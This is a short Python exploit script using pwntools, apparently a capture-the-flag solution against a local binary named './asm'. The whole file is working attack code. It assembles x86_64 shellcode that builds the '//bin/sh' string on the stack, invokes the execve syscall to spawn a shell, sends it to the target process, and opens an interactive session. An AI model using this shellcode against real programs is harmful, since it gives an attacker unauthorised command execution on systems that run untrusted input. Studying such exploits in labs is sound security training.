# asm.py
from pwn import *
context.arch = 'x86_64'
p = process("./asm")

payload = asm("xor rcx, rcx")
payload += asm("push rcx")
payload += asm("mov rbx, 0x68732f6e69622f2f")
payload += asm("push rbx")
payload += asm("mov rdi, rsp")
payload += asm("mov al, 59")
payload += asm("mov rsi, 0")
payload += asm("mov rdx, 0")
payload += asm("syscall")

p.send(payload)

p.interactive()